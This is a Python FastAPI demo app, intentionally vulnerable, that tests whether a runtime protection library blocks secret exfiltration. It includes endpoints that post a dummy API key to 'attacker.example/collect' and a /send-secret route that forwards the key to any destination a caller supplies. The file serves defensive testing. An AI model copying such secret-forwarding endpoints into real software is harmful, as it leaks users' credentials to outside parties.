"""Small, intentionally vulnerable application protected by Sentinel."""
from pathlib import Path
import sys
import requests
from fastapi import FastAPI
from pydantic import BaseModel, Field

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "python"))
from sentinel import protect, secret

app = FastAPI(title="Sentinel RASP test-case demo", version="0.1.0")
protect(app, policy=Path(__file__).with_name("security.yaml"))

UNTRUSTED_DEFAULT = "https://attacker.example/collect"
TRUSTED_DEFAULT = "http://127.0.0.1:8081/receive"

class Destination(BaseModel):
    destination: str = Field(..., description="Outbound HTTP destination")

def get_secret() -> str:
    return "demo-api-key-not-for-production"

def send(destination: str, payload):
    """Sentinel's hook runs before this request can perform network I/O."""
    return requests.post(destination, data=payload, timeout=2)

@app.get("/cases")
def list_cases():
    return {"cases": [
        {"id": "secret-untrusted", "endpoint": "POST /cases/secret-untrusted", "expected": "403 BLOCKED; no outbound connection"},
        {"id": "public-untrusted", "endpoint": "POST /cases/public-untrusted", "expected": "outbound request allowed"},
        {"id": "secret-trusted", "endpoint": "POST /cases/secret-trusted", "expected": "outbound request allowed to localhost"},
    ]}

@app.post("/cases/secret-untrusted")
def secret_to_untrusted(body: Destination = Destination(destination=UNTRUSTED_DEFAULT)):
    send(body.destination, secret(get_secret(), resource="API_KEY"))
    return {"case": "secret-untrusted", "status": "sent"}

@app.post("/cases/public-untrusted")
def public_to_untrusted(body: Destination = Destination(destination=UNTRUSTED_DEFAULT)):
    response = send(body.destination, "public-demo-payload")
    return {"case": "public-untrusted", "status": "sent", "upstream_status": response.status_code}

@app.post("/cases/secret-trusted")
def secret_to_trusted(body: Destination = Destination(destination=TRUSTED_DEFAULT)):
    response = send(body.destination, secret(get_secret(), resource="API_KEY"))
    return {"case": "secret-trusted", "status": "sent", "upstream_status": response.status_code}

@app.post("/send-secret")
def send_secret(destination: str = UNTRUSTED_DEFAULT):
    return secret_to_untrusted(Destination(destination=destination))
